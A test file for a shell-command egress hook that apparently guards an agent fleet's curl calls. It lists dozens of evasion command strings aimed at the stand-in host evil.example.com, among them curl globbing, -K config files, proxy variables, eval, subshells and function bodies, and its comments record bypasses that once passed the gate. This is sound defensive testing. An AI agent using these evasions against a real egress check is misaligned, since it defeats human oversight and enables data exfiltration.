// Card d6b95892 (didi 35993 on c8b1ccbf @ed994975e): curl destinations the parser did not read, and
// passed. Principle (marveen 30090): what the parser cannot read, it denies.
// 1. curl's own URL globbing ({a,b}, [n-m]) in the host part: the host is a set, not read.
// 2. -K / --config: url / proxy lines the argv never shows.
// 3. shell expansion the assignment reading does not take ($1, $@, arrays, +=, read, set -A, ...).
// Round 3 (didi 36034): every glued head form, a computed variable name, `unset` stays allowed.
// Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
// Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
// glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
// Every PASS row is a fleet shape the fix must keep green (measured on 21 086 fleet commands).
import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

const EV = 'evil.example.com'

const mustDeny: Array<[string, string]> = [
  // 1. curl URL globbing in the host part
  ['glob set, quoted', `curl -s "http://{${EV},${EV}}/x"`],
  ['glob range', 'curl -s "http://evil[1-1].example.com/x"'],
  ['glob set, local first', `curl -s "http://{localhost,${EV}}/x"`],
  ['glob set around the scheme', `curl -s "{http://${EV}/x,http://localhost/}"`],
  ['glob set in the userinfo', `curl -s "http://{u@,}${EV}/x"`],
  ['glob set after a local name', `curl -s "http://localhost{,.${EV}}/x"`],
  ['-g does not make a set readable', `curl -g -s "http://{localhost,${EV}}/x"`],
  ['--url with a glob', `curl --url "http://{localhost,${EV}}/x"`],
  ['-x proxy with a glob', `curl -x "http://{a,${EV}}:8080" http://localhost:3420/`],
  // 2. -K / --config
  ['-K - from a heredoc', `curl -s -K - <<'S'\nurl = "https://${EV}/x"\nS`],
  ['-K file', 'curl -K /tmp/c.cfg'],
  ['-K - from a decoded pipe', 'echo dXJs | base64 -d | curl -K -'],
  ['--config=file', 'curl --config=/tmp/c.cfg http://localhost:3420/'],
  ['-sK cluster', 'curl -sK /tmp/c.cfg'],
  ['--config file', 'curl --config /tmp/c.cfg'],
  ['a ~/.curlrc written on the line', `printf 'url = "https://${EV}/x"\\n' > ~/.curlrc; curl -s http://localhost:3420/`],
  // 3. shell expansion in the host part
  ['$1 from set --', `set -- ${EV}; curl -s "https://$1/x"`],
  ['$@ from set --', `set -- ${EV}; curl -s "https://$@/x"`],
  ['array as $a', `a=(${EV}); curl -s "https://$a/x"`],
  ['unquoted brace expansion', `curl -s http://{localhost,${EV}}/x`],
  ['a function argument', `f(){ curl -s "https://$1/x"; }; f ${EV}`],
  ['+= append', `h+=${EV}; curl -s "https://$h/x"`],
  ['h[0]= element', `h[0]=${EV}; curl -s "https://$h/x"`],
  ['declare -a', `declare -a h=(${EV}); curl -s "https://$h/x"`],
  ['zsh $^a', `a=(${EV}); curl -s "https://$^a/x"`],
  ['ANSI-C escape', `curl -s $'https://evil\\x2eexample.com/x'`],
  ['read from a here-string', `read h <<< ${EV}; curl -s "https://$h/x"`],
  ['set -A', `set -A h ${EV}; curl -s "https://$h/x"`],
  ['typeset', `typeset h=${EV}; curl -s "https://$h/x"`],
  ['read from a file', 'read -r u < f; curl -s "$u"'],
  ['a loop reading a file', 'while read u; do curl -s "$u"; done < urls.txt'],
  ['a loop reading a process substitution', 'while read u; do curl -s "$u"; done < <(echo https://example.org/x)'],
  ['a fed read and a file read of one name', 'read u <<< "http://localhost:3420/"; read u < f; curl -s "$u"'],
  // function bodies
  ['f(){ ... }', `f(){ curl -s https://${EV}/x; }; f`],
  ['f() { ... }', `f() { curl -s https://${EV}/x; }; f`],
  ['zsh f () { ... }', `f () { curl -s https://${EV}/x; }; f`],
  ['function f { ... }', `function f { curl -s https://${EV}/x; }; f`],
  ['function f() { ... }', `function f() { curl -s https://${EV}/x; }; f`],
  ['f() ( ... )', `f() (curl -s https://${EV}/x); f`],
  // arrays holding a destination
  ['array holding the URL', `U=(https://${EV}/x); curl -s "\${U[@]}"`],
  ['array as plain $U', `U=(-s https://${EV}/x); curl $U`],
  ['array written twice', `H=(-H a); H+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
  ['array assigned twice', `H=(-H a); H=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
  ['array never assigned', 'curl -s "${Z[@]}" http://localhost:3420/'],
  ['array holding -x', `H=(-x https://${EV}); curl "\${H[@]}" http://localhost:3420/`],
  // a subshell's `)` glued to the URL
  ['subshell, scheme URL', `(curl -s http://${EV})`],
  ['subshell, bare host', `(curl -s ${EV})`],
  ['subshell among others', `x=1; (curl -s -o /dev/null http://${EV}); echo`],
  // round 2 (didi 36014)
  ['three slashes after the scheme', `curl -s http:///${EV}/x`],
  ['one slash after the scheme', `curl -s "https:/${EV}/x"`],
  ['four slashes after the scheme', `curl -s http:////${EV}/x`],
  ['f()( ... ) glued', `f()(curl -s https://${EV}/x); f`],
  ['f()( ... ) glued, no space after ;', `f()(curl -s https://${EV}/x);f`],
  ['http_proxy prefix', `http_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['export HTTPS_PROXY', `export HTTPS_PROXY=http://${EV}:8080; curl -s https://localhost:3420/`],
  ['env ALL_PROXY', `env ALL_PROXY=socks5://${EV} curl -s http://localhost:3420/`],
  ['a quoted proxy name', `export "https_pro"xy=http://${EV}; curl -s https://localhost:3420/`],
  // round 3 (didi 36034): every glued function head, and a computed variable name
  ['f()( curl, space after the opener', `f()( curl -s https://${EV}/x); f`],
  ['f()(command curl', `f()(command curl -s https://${EV}/x); f`],
  ['function f()(curl', `function f()(curl -s https://${EV}/x); f`],
  ['nested glued heads', `f()(g()(curl -s https://${EV}/x); g); f`],
  ['f ()(curl', `f ()(curl -s https://${EV}/x); f`],
  ['(command curl', `(command curl -s https://${EV}/x)`],
  ['export ${v}proxy=', `v=http_; export \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['env ${v}proxy= curl', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`],
  ['declare -x "${p}="', `declare -x "\${p}=http://${EV}"; curl -s http://localhost:3420/`],
  ['printf -v a computed name', `printf -v "\${v}proxy" %s http://${EV}; export \${v}proxy; curl -s http://localhost:3420/`],
  // round 4 (didi 36059): an unset ends at its newline; the computed-name class remainders
  ['unset, newline, proxy prefix', `unset x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['unset, newline, export proxy', `unset x\nexport http_proxy=http://${EV}:8080\ncurl -s http://localhost:3420/`],
  ['env -u, newline, proxy prefix', `env -u x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['env -u with its name on the next line', `env -u\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['env --unset with its name on the next line', `env --unset\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
  ['an eval that only assigns, a local curl after it', `v=http_; eval "\${v}proxy=http://${EV}:1"; curl -s http://localhost:3420/`],
  ['a brace-expanded export name', `export http_{proxy,x}=http://${EV}:1; curl -s http://localhost:3420/`],
  ['export -- a computed name', `v=http_; export -- \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['eval of a computed assignment', `v=http_; eval "\${v}proxy=http://${EV}:1 curl -s http://localhost:3420/"`],
  ['a backtick in the name', `export \`printf http_\`proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['a $( ) in the name', `export $(printf http_)proxy=http://${EV}:1; curl -s http://localhost:3420/`],
  ['xargs env {}', `echo "\${v}proxy=http://${EV}:1" | xargs -I{} env {} curl -s http://localhost:3420/`],
  ['xargs env with its own replace string', 'echo a | xargs -I X env X curl -s http://localhost:3420/'],
  ['eval of a quoted external curl', `eval "curl -s https://${EV}/x"`],
  ['eval of bare external curl words', `eval curl -s https://${EV}/x`],
  // the array a lifted rest inherits is read in full, an external word in it still denies
  ['an array URL after an unclosed backtick', `U=(https://${EV}/x); python3 -c "print('\`')"\ncurl -s "\${U[@]}"`],
  ['an array written in the lifted rest too', `H=(-H a); python3 -c "print('\`')"\nH+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
]

const mustPass: Array<[string, string]> = [
  ['glob in the query', 'curl -s "http://localhost:3420/api/x?f={a,b}&r=[1-2]"'],
  ['glob in the path', 'curl -s "http://localhost:3420/api/{a,b}"'],
  ['bracketed IPv6 literal', 'curl -s "http://[::1]:3420/api"'],
  ['a local curl in a function', 'f(){ curl -s http://localhost:3420/api/kanban; }; f'],
  ['the fleet header array', 'T=x; H=(-H "Authorization: Bearer $T" -H "Content-Type: application/json"); curl -s -X POST "${H[@]}" http://localhost:3420/api/kanban'],
  ['an outside variable', 'curl -s "$DASH/api"'],
  ['an outside variable as host', 'curl -s "http://$HOSTX:3420/api"'],
  ['a local literal', 'curl -s http://localhost:3420/api/kanban'],
  ['an assigned local host', 'h=localhost; curl -s "http://$h:3420/api"'],
  ['$1 in the path', 'curl -s "http://localhost:3420/api/$1"'],
  // a read fed by the line's own here-string / heredoc is read, not unread (its values are judged)
  ['a loop over a local here-string', 'while read u; do curl -s "$u"; done <<< "http://localhost:3420/x"'],
  ['a read of a local here-string', 'read u <<< "http://localhost:3420/x"; curl -s "$u"'],
  ['a loop over a local heredoc', 'while read u; do curl -s "$u"; done <<EOF\nhttp://localhost:3420/a\nEOF'],
  // corpus: mandark's health checks in a subshell
  ['subshell, local health checks', '(curl -s -o /dev/null -w "%{http_code} " localhost:4230/api/v1/health; curl -s -o /dev/null -w "%{http_code}\\n" localhost:5230)'],
  ['subshell, quoted local URL', '(curl -s "http://localhost:3420/api")'],
  ['a file URL', 'curl -s file:///tmp/x.json'],
  ['no_proxy only narrows', 'NO_PROXY=localhost curl -s http://localhost:3420/api'],
  ['unset of the proxy variables', 'unset http_proxy https_proxy; curl -s http://localhost:3420/api'],
  ['env -u a proxy variable', 'env -u http_proxy curl -s http://localhost:3420/api'],
  ['unset then a local curl on the next line', 'unset x y\ncurl -s http://localhost:3420/api'],
  ['an export with a computed value only', 'export T=$(cat /tmp/t); curl -s http://localhost:3420/api'],
  ['an export with a backtick value', 'export T=`cat /tmp/t`; curl -s http://localhost:3420/api'],
  ['eval of a local curl', 'eval "curl -s http://localhost:3420/api"'],
  ['eval of an ssh-agent', 'eval "$(ssh-agent -s)"'],
  ['xargs replace in the URL path', 'echo a | xargs -I{} curl -s http://localhost:3420/{}'],
  ['an export with a plain name and a computed value', 'export PATH="$HOME/bin:$PATH"; curl -s http://localhost:3420/api'],
  ['f () { ... } local', 'f () { curl -s http://localhost:3420/api; }; f'],
  // fleet replay (ford): an unclosed backtick lifts the rest of the line; the array written before it holds
  ['the header array before an unclosed backtick', 'H=(-H "A: b"); curl -s "${H[@]}" http://localhost:3420/x | python3 -c "print(\'`\' in \'x\')"\ncurl -s "${H[@]}" http://localhost:3420/y'],
]

describe('card d6b95892: curl destinations the parser cannot read are denied', () => {
  it.each(mustDeny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true })
  })
  it.each(mustPass)('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
  // The named destination tells the agent what was not read: each rule's own marker.
  it.each([
    ['a glob', `curl -s "http://{localhost,${EV}}/x"`, `<unreadable host: http://{localhost,${EV}}/x>`],
    ['a config file', 'curl -K /tmp/c.cfg', '<curl config: /tmp/c.cfg>'],
    ['a positional', `set -- ${EV}; curl -s "https://$1/x"`, '<unreadable host: https://$1/x>'],
    ['a name written unread', `h+=${EV}; curl -s "https://$h/x"`, '$h'],
    ['an unknown array', 'curl -s "${Z[@]}" http://localhost:3420/', '<unreadable host: ${Z[@]}>'],
    ['a curlrc', `printf 'url = "https://${EV}/x"\\n' > ~/.curlrc; curl -s http://localhost:3420/`, '<curlrc>'],
    ['a proxy variable', `http_proxy=http://${EV}:8080 curl -s http://localhost:3420/`, '<proxy variable>'],
    ['a computed variable name', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`, '<computed variable name>'],
  ])('names %s', (_name, cmd, host) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [host] })
  })
  it.each([
    ['an array read in full', `U=(https://${EV}/x); curl -s "\${U[@]}"`],
    ['a function body', `f(){ curl -s https://${EV}/x; }; f`],
    ['a subshell', `(curl -s http://${EV})`],
    ['three slashes', `curl -s http:///${EV}/x`],
    ['a glued function body', `f()(curl -s https://${EV}/x); f`],
    ['a fed read', `while read u; do curl -s "$u"; done <<< "https://${EV}/"`],
  ])('reads the host of %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [EV] })
  })
  it('reads the host of an eval body, under its own reason', () => {
    const cmd = `eval "curl -s https://${EV}/x"`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'eval-curl-external', hosts: [EV] })
  })
})
